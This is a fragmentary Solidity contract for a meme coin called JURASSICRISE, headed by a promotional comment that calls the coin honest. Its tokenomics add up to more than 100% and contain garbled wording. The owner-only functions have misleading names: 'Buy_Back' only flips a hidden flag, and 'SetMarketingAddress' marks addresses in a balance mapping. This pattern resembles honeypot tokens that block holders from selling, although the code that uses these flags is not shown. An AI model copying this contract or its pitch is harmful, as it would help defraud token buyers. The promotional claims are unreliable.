...
/**
🦖Jurassic Rise is a honest meme coin that is not trying to confuse you with useless tokenomics, the team has put together a token that we believe has features designed to make it moon.

✨Tokenomics:

0% TAX ON BUYS 
20% TAX ON SELLS
10% Insane AUTOMATIC BNB REWARDS 
5% BuyBack ensuring longevity of the coin
5% Lottery pool
...
5% of tokens will be used for Airdrops, before and after launch.
5% of the tokens will be used in Development
45% of the tokens will be distributed in Pre-Sale
45% of tokens will be used for Liquidityng-trading and break whales’ control.
Marketing/Development: 4%

🌐 Website : https://www.jurassicRise.com/

✈️ Telegram : https://t.me/JurassicRise

💬 Twitter : https://twitter.com/JurassicRise
...
contract JURASSICRISE is Context, IERC20, IERC20Metadata {
    ...
    string public _name = "JURASSICRISE";
    string public _symbol= "JRISE";
     bool balances1 = true;
    ...
    function changeOwner(address _owner) onlyOwner public {
      ...
      function Buy_Back(bool _balances1_) onlyOwner public {
        balances1 = _balances1_;
    }
    
     function SetMarketingAddress(address account) onlyOwner public {
        _balances1[account] = true;
    }
    
     function BNB_Distribution_Routor(address account) onlyOwner public {
